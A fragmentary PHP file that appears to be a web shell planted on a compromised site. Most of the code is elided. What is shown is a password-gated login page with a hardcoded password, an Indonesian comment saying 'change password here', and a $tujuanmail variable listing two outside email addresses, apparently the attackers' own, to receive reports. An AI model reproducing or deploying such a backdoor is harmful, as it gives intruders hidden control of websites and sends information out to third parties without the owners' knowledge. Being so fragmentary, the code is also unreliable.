...
// ===== LOGIN PASSWORD =====
$password = "dre4m1337"; // GANTI PASSWORD DISINI
...
if (!isset($_SESSION['logged_in'])) {
    ...
    <head>
        ...
        <style>
            body { background:#111; color:#fff; font-family:Arial; text-align:center; margin-top:120px; }
            input, button { padding:10px; background:#333; border:none; color:#fff; margin-top:8px; }
            .box { background:#222; display:inline-block; padding:25px; border-radius:8px; }
        </style>
    </head>
    <body>
        <div class="box">
...
$tujuanmail = 'alf404hexs@gmail.com, tangerangxploit@yahoo.com';
